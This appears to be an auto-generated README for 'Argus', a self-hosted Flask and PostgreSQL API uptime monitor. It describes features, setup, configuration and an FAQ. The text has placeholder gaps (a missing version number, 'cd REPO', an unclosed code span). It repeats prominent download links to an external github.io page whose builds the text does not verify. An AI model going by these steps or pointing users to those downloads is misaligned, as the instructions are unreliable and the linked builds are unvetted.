# Argus v - API Uptime Monitoring Tool 2026

> **Argus is a self-hosted, web-based monitor for API uptime. It checks endpoint health, records response times, and presents availability information through a focused dashboard.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/ethan-hallonp2558/argus-v-api-monitor?style=flat-square)](https://github.com/ethan-hallonp2558/argus-v-api-monitor)

---

<p align="center">
  <a href="https://ethan-hallonp2558.github.io/argus-v-api-monitor/">
    <img src="https://img.shields.io/badge/Download-Argus%20Latest-brightgreen?style=for-the-badge" alt="Download Argus">
  </a>
</p>

> **[Download Argus v](https://ethan-hallonp2558.github.io/argus-v-api-monitor/)**

---

[Download Latest Build](https://ethan-hallonp2558.github.io/argus-v-api-monitor/)

---

## What Argus Does

Argus provides an always-on view of API endpoint availability and behavior. Its dashboard makes status changes and response-time information easy to review, giving teams and independent operators a practical alternative to hosted monitoring services.

The application is intended to run on infrastructure you control. Built with Flask and PostgreSQL, it keeps monitoring data within a self-hosted deployment while providing account login, endpoint administration, and scheduled health checks in one workflow.

---

## Core Capabilities

- Runs automatic endpoint checks at five-minute intervals
- Performs an initial ping as soon as an endpoint is created
- Displays current up/down conditions in a live dashboard
- Saves response times for historical review
- Supports adding, editing, and deleting monitored endpoints
- Provides browser-side endpoint search
- Uses email and password authentication
- Runs as a self-hosted Flask and PostgreSQL application

---

## Getting Started

Obtain the repository or project files and prepare them in the environment where you plan to run Argus.

1. Clone the source repository:
   - `git clone https://github.com/ethan-hallonp2558/argus-v-api-monitor.git
2. Enter the resulting directory:
   - `cd REPO`
3. Set up the Flask application and configure its PostgreSQL connection.
4. Launch the application with the web application command appropriate for your environment.

For a release archive or hosted build, use the download link above and apply the deployment instructions supplied with it.

---

## Using Argus

Once the application is running, log in and register the API URLs that should be monitored. Argus performs the checks automatically and reports the latest results in the dashboard.

A standard monitoring flow looks like this:

1. Register a new account or sign in.
2. Enter and save an endpoint URL.
3. Check the result of the endpoint's immediate ping.
4. Follow availability and response-time records from the dashboard.
5. Adjust the endpoint list by editing or deleting entries when needed.

The built-in search can narrow the endpoint list, which is useful when multiple services are being monitored.

---

## Application Settings

The Flask project configuration contains the application settings, while PostgreSQL provides persistent storage. Before deployment, supply the appropriate database connection information, authentication values, and monitoring options in the applicable configuration.

Example settings layout:

    DATABASE_URL=postgresql://user:password@localhost:5432/argus
    SECRET_KEY=your-secret-key
    MONITOR_INTERVAL=5m

When environment files are part of your deployment process, place confidential values there rather than embedding them directly in source code.

---

## System Requirements

- A web browser to access the dashboard
- A working Flask runtime
- PostgreSQL
- Network connectivity from the host to monitored endpoints
- An environment that can run the self-hosted application

---

## Frequently Asked Questions

**What is the endpoint check interval?**  
Argus automatically pings monitored endpoints every 5 minutes.

**Are response times recorded as well as uptime?**  
Yes. Response-time data is logged so performance history can be viewed together with availability.

**Can endpoints be maintained through the dashboard?**  
Yes. The interface supports endpoint creation, editing, deletion, and search.

**Does Argus provide downtime alerts?**  
The project includes email alerts for endpoints that go down. Configure the email options during installation.

**Where are the application options configured?**  
Set them through the Flask application configuration and the environment variables or deployment files used by your installation.

**What can I check when the dashboard fails to load or monitoring checks fail?**  
Confirm that the Flask service is running, that PostgreSQL accepts the configured connection, and that the host can reach the endpoint URLs.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
